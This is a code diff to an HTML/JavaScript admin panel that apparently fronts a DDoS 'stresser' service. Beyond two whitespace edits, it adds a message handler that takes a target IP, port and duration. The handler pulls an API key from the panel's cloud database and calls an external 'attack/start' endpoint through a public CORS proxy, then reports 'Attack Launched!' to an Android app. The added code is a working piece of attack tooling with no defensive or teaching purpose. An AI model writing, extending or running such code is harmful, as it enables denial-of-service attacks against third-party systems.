@@ -138,7 +138,6 @@
             if (!db) return alert("𝐄𝐧𝐭𝐞𝐫 𝐃𝐁 𝐔𝐑𝐋");
             if (!db.endsWith('/')) { dbUrlInput.value = db + '/'; }
             localStorage.setItem('dbUrl', dbUrlInput.value);
-            
             await fetch(`${dbUrlInput.value}settings/config.json`, { method: 'PATCH', body: JSON.stringify({ db_url: dbUrlInput.value }) });
             alert("𝐃𝐁 𝐔𝐑𝐋 𝐒𝐚𝐯𝐞𝐝 & 𝐏𝐮𝐬𝐡𝐞𝐝 𝐭𝐨 𝐂𝐥𝐨𝐮𝐝!");
         }
@@ -275,7 +274,7 @@
             document.getElementById('newKeyDisplay').classList.remove('hidden');
             document.getElementById('newKeyText').innerText = generatedKeyText;
             document.getElementById('keyName').value = '';
-            fetchKeys(); 
+            fetchKeys();
         }
 
         function copyGeneratedKey() {
@@ -336,6 +335,53 @@
                 fetchKeys();
             }
         }
+
+        // ==========================================
+        // REAL APP CONNECTION LOGIC
+        // ==========================================
+        window.addEventListener("message", async function(event) {
+            if (event.data && event.data.action === "ATTACK") {
+                const { ip, port, duration } = event.data;
+                const db = dbUrlInput.value;
+                
+                if(!db) {
+                    Android.onAttackResponse("ERROR", "Database URL not set in Panel");
+                    return;
+                }
+
+                try {
+                    const res = await fetch(`${db}settings/config.json`);
+                    const data = await res.json();
+                    let apiKey = "";
+                    for(let i=1; i<=10; i++) {
+                        if(data[`api_key_${i}`] && data[`api_key_${i}`].trim() !== "") {
+                            apiKey = data[`api_key_${i}`].trim();
+                            break;
+                        }
+                    }
+
+                    if(!apiKey) {
+                        Android.onAttackResponse("ERROR", "No API Key Found in Panel");
+                        return;
+                    }
+
+                    const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=${ip}&port=${port}&time=${duration}`;
+                    const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+                    
+                    const apiRes = await fetch(proxyUrl);
+                    const apiText = await apiRes.text();
+
+                    // REAL CHECK: Agar API me "success" ya "dispatched" hai tabhi success bhejo
+                    if (apiText.includes('"status": "success"') || apiText.includes('"status":"success"') || apiText.includes('Attack dispatched')) {
+                        Android.onAttackResponse("SUCCESS", "Attack Launched!");
+                    } else {
+                        Android.onAttackResponse("ERROR", "API Failed: Invalid Key or Max Concurrent");
+                    }
+                } catch(e) {
+                    Android.onAttackResponse("ERROR", "Network Error");
+                }
+            }
+        });
     </script>
 </body>
 </html>
